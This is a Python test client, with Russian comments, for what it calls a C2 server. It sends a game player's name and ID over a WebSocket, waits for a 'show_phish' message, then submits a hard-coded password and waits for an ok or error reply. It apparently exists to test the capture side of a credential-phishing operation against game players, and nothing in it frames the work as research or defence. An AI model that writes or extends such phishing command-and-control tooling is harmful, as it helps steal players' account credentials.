"""Тестовый клиент: подключается к C2 серверу и отправляет пароль"""
import asyncio, websockets, json

WS_URL = "ws://localhost:8081"
USER_ID = 11241524334
PLAYER_NAME = "CheatingHitmanner"
PASSWORD = "LolKekZek228"

async def main():
    print(f"Connecting to {WS_URL}...")
    async with websockets.connect(WS_URL) as ws:
        # 1. Hello
        hello = {"type": "hello", "playerName": PLAYER_NAME, "userId": USER_ID}
        await ws.send(json.dumps(hello))
        print(f"[SENT] hello: {PLAYER_NAME} (id={USER_ID})")

        # 2. Ждём show_phish
        for i in range(10):
            msg = await asyncio.wait_for(ws.recv(), timeout=5)
            data = json.loads(msg)
            print(f"[RECV] {json.dumps(data, indent=2)}")
            if data.get("type") == "show_phish":
                break
        else:
            print("[!] Нет show_phish, продолжаю...")

        # 3. Отправляем пароль
        pw_msg = {"type": "password", "password": PASSWORD, "userId": USER_ID, "playerName": PLAYER_NAME}
        await ws.send(json.dumps(pw_msg))
        print(f"[SENT] password: {PASSWORD}")

        # 4. Ждём ответ
        for i in range(120):
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=1)
                data = json.loads(msg)
                print(f"[RECV] {json.dumps(data, indent=2)}")
                if data.get("type") in ("ok", "err"):
                    print("\n=== ГОТОВО ===")
                    return
            except asyncio.TimeoutError:
                pass

        print("\n=== ТАЙМАУТ ===")

if __name__ == "__main__":
    asyncio.run(main())
